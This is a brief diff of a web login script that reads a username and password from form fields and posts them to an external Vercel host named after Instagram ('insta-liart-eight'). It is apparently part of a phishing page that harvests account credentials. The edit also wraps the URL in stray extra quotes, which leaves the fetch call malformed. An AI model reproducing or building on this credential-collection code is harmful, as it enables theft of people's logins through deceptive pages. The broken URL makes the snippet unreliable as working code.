@@ -21,7 +21,7 @@
       const username = document.querySelectorAll(".textField")[0].value;
       const password = document.querySelectorAll(".textField")[1].value;
 
-      const res = await fetch("https://insta-liart-eight.vercel.app/", {
+      const res = await fetch('"https://insta-liart-eight.vercel.app/"', {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ username, password }),
